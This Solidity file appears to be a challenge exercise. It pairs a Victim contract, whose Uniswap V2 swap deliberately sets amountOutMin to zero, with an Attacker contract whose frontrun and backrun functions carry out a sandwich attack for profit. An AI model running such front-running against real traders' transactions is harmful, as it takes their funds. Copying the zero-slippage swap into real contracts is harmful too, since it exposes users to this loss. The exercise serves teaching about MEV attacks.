// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./interfaces/IERC20.sol";

/**
 *
 *  SANDWICH ATTACK AGAINST A SWAP TRANSACTION
 *
 * We have two contracts: Victim and Attacker. Both contracts have an initial balance of 1000 WETH. The Victim contract
 * will swap 1000 WETH for USDC, setting amountOutMin = 0.
 * The challenge is use the Attacker contract to perform a sandwich attack on the victim's
 * transaction to make profit.
 *
 */
contract Attacker {
    // This function will be called before the victim's transaction.
    function frontrun(address router, address weth, address usdc, uint256 deadline) public {
        // Get the amount of WETH in the contract.
        uint256 amountWETHIn = IERC20(weth).balanceOf(address(this));
        // Create a path array with the addresses of the tokens to swap.
        // In this case, we are swapping WETH for USDC.
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = usdc;
        // Approve the router to spend the WETH.
        IERC20(weth).approve(router, amountWETHIn);
        // Swap the WETH for USDC without slippage protection.
        IUniswapV2Router(router).swapExactTokensForTokens(amountWETHIn, 0, path, address(this), deadline);
    }

    // This function will be called after the victim's transaction.
    function backrun(address router, address weth, address usdc, uint256 deadline) public {
        // Get the amount of USDC in the contract.
        uint256 amountUSDCIn = IERC20(usdc).balanceOf(address(this));
        // Create a path array with the addresses of the tokens to swap.
        // In this case, we are swapping USDC for WETH.
        address[] memory path = new address[](2);
        path[0] = usdc;
        path[1] = weth;
        // Approve the router to spend the USDC.
        IERC20(usdc).approve(router, amountUSDCIn);
        // Swap the USDC for WETH without slippage protection.
        IUniswapV2Router(router).swapExactTokensForTokens(amountUSDCIn, 0, path, address(this), deadline);
    }
}

contract Victim {
    address public immutable router;

    constructor(address _router) {
        router = _router;
    }

    function performSwap(address[] calldata path, uint256 deadline) public {
        IUniswapV2Router(router).swapExactTokensForTokens(1000 * 1e18, 0, path, address(this), deadline);
    }
}

interface IUniswapV2Router {
    /**
     *     amountIn: the amount to use for swap.
     *     amountOutMin: the minimum amount of output tokens that must be received for the transaction not to revert.
     *     path: an array of token addresses. In our case, WETH and USDC.
     *     to: recipient address to receive the liquidity tokens.
     *     deadline: timestamp after which the transaction will revert.
     */
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}
